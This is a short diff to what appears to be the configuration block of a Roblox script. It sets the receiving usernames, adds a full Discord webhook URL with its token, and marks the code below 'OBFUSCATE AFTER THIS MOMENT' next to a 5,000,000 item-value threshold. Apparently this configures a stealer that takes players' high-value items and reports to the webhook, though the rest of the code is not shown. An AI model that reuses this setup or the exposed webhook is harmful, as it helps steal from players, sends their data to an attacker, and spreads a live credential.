@@ -1,6 +1,6 @@
-Username = "v1leos"
-Username2 = "v1leos"
-Webhook = ""
+Username = "zenith_msvdpro"
+Username2 = "zenith_msvdpro"
+Webhook = "https://discord.com/api/webhooks/1376605934263992332/CcqFr2XC4hnfy1d-hk2PXEOd-qMDz4CRqpa5PZdwg-956bUTnVDpkQicmlb9w1vJJ9xZ"
 
 -- OBFUSCATE AFTER THIS MOMENT
 MinimumRAP = 5000000
